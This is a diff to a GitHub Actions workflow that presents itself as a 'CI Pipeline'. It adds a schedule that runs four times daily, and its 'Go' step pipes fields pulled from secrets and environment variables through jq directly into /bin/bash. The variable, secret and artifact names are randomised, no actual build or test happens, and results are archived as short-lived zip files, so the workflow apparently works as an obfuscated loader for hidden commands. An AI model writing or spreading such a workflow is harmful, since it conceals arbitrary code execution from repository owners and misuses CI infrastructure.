@@ -2,6 +2,8 @@ name: CI Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '33 3,9,15,21 * * *'
 env:
   CI: true
 concurrency:
@@ -14,15 +16,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Go
         env:
-          hegh688: ${{ secrets.hegh688 }}
+          u16739: ${{ secrets.u16739 }}
         run: |
-          printf '%s' "$hegh688" | jq -r .qrc38368 | /bin/bash
-          echo $wxlf987 | jq -r .xiz35244 | /bin/bash
-          echo $ljixr5874 | jq -r .s59 | /bin/bash
+          printf '%s' "$u16739" | jq -r .bx2 | /bin/bash
+          printf '%s' "$ggvd57193" | jq -r .ulpgi58 | /bin/bash
+          echo $q101 | jq -r .q76507 | /bin/bash
+          echo $kwnsn97407 | jq -r .y048 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: etnIwuCQ
+          name: lmIgFSnB
           path: "*.zip"
           retention-days: 1
